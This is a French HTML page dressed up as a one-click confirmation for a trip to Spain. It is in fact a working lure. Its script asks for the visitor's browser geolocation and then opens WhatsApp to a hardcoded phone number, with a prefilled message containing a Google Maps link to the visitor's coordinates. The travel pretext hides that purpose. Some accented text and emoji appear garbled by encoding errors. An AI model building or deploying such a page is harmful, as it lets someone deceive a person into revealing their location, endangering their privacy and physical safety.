<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirmation de votre voyage en Espagne</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: linear-gradient(45deg, #ff7e5f, #feb47b);
            margin: 0;
            animation: backgroundAnimation 5s infinite alternate;
        }
        .container {
            text-align: center;
            background-color: white;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            width: 80%;
            max-width: 500px;
            position: relative;
            animation: zoomIn 1s ease-out;
        }
        h1 {
            font-size: 2.5em;
            color: #333;
            margin-bottom: 15px;
            animation: fadeIn 2s ease-in-out;
        }
        #locationMessage {
            font-size: 18px;
            margin-bottom: 20px;
            padding: 15px;
            background-color: #e9f7ef;
            border-radius: 10px;
            display: none;
            animation: slideIn 1s ease-in-out;
        }
        button {
            background-color: #25d366; 
            color: white;
            padding: 15px 25px;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            cursor: pointer;
            transition: transform 0.3s ease-in-out;
        }
        button:hover {
            transform: scale(1.1);
        }
        @keyframes backgroundAnimation {
            0% { background: linear-gradient(45deg, #ff7e5f, #feb47b); }
            100% { background: linear-gradient(45deg, #feb47b, #ff7e5f); }
        }
        @keyframes zoomIn {
            0% { transform: scale(0.9); opacity: 0; }
            100% { transform: scale(1); opacity: 1; }
        }
        @keyframes fadeIn {
            0% { opacity: 0; }
            100% { opacity: 1; }
        }
        @keyframes slideIn {
            0% { transform: translateY(20px); opacity: 0; }
            100% { transform: translateY(0); opacity: 1; }
        }
    </style>
</head>
<body>

<div class="container">
    <h1>Bon voyage en Espagne üá™üá∏ !</h1>
    <p>Confirmez votre voyage en un seul clic !</p>

    <div id="locationMessage">Bon voyage ! Nous vous avons r√©serv√© un itin√©raire pour l'Espagne üá™üá∏.</div>

    <button id="sendLocationButton">Confirm√©</button>
</div>

<script>
    let lat, lon;

    // Fonction pour obtenir la localisation
    function getLocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(showPosition, showError);
        } else {
            alert("G√©olocalisation non support√©e par ce navigateur.");
        }
    }

    // Si la localisation est r√©cup√©r√©e avec succ√®s
    function showPosition(position) {
        lat = position.coords.latitude;
        lon = position.coords.longitude;

        // Affiche un message anim√©
        document.getElementById('locationMessage').style.display = 'block'; // Affiche le message
        document.getElementById('locationMessage').innerText = `Bon voyage ! Nous vous avons r√©serv√© un itin√©raire pour l'Espagne üá™üá∏.`;
        document.getElementById('locationMessage').style.animation = 'slideIn 1s ease-in-out';
        
        // Apr√®s un d√©lai, on envoie la position via WhatsApp
        setTimeout(sendLocationOnWhatsApp, 2000);
    }

    // En cas d'erreur lors de la r√©cup√©ration de la position
    function showError(error) {
        switch(error.code) {
            case error.PERMISSION_DENIED:
                alert("L'utilisateur a refus√© la demande de g√©olocalisation.");
                break;
            case error.POSITION_UNAVAILABLE:
                alert("La position est indisponible.");
                break;
            case error.TIMEOUT:
                alert("La demande de g√©olocalisation a expir√©.");
                break;
            case error.UNKNOWN_ERROR:
                alert("Une erreur inconnue est survenue.");
                break;
        }
    }

    // Fonction pour envoyer la localisation sur WhatsApp
    function sendLocationOnWhatsApp() {
        if (lat && lon) {
            const locationUrl = `https://www.google.com/maps?q=${lat},${lon}`;
            const message = `Bon voyage ! Nous vous avons r√©serv√© un itin√©raire pour l'Espagne üá™üá∏.\nVoici ma position actuelle : ${locationUrl}`;

            const whatsappUrl = `https://wa.me/33605993097?text=${encodeURIComponent(message)}`;
            window.open(whatsappUrl, '_blank');
        } else {
            alert("Veuillez activer la g√©olocalisation pour partager votre position.");
        }
    }

    // Lorsque le bouton est cliqu√©
    document.getElementById('sendLocationButton').addEventListener('click', function() {
        getLocation();
    });
</script>

</body>
</html>
